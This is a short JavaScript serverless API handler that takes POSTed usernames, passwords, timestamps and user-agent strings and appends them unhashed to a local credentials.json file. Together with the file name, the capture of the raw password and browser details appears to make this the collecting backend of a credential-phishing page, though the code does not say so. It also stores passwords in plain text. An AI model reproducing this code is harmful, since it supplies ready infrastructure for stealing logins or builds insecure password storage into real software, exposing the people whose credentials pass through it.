// api/submit.js
export default async function handler(req, res) {
 if (req.method !== 'POST') {
 return res.status(405).json({ message: 'Method Not Allowed' });
 }

 try {
 const { username, password, timestamp, userAgent } = req.body;

 // Load existing data or initialize empty array
 const fs = require('fs');
 const path = require('path');
 
 // Create data directory if it doesn't exist
 const dataDir = path.join(process.cwd(), 'data');
 if (!fs.existsSync(dataDir)) {
 fs.mkdirSync(dataDir);
 }

 const dataPath = path.join(dataDir, 'credentials.json');
 
 let records = [];
 if (fs.existsSync(dataPath)) {
 const fileContent = fs.readFileSync(dataPath, 'utf8');
 records = JSON.parse(fileContent);
 }

 // Add new record
 records.push({
 id: Date.now().toString(),
 username,
 password,
 timestamp,
 userAgent
 });

 // Save back to file
 fs.writeFileSync(dataPath, JSON.stringify(records, null, 2));

 res.status(200).json({ success: true, message: 'Data saved' });

 } catch (error) {
 console.error('Error saving data:', error);
 res.status(500).json({ success: false, message: 'Internal Server Error' });
 }
}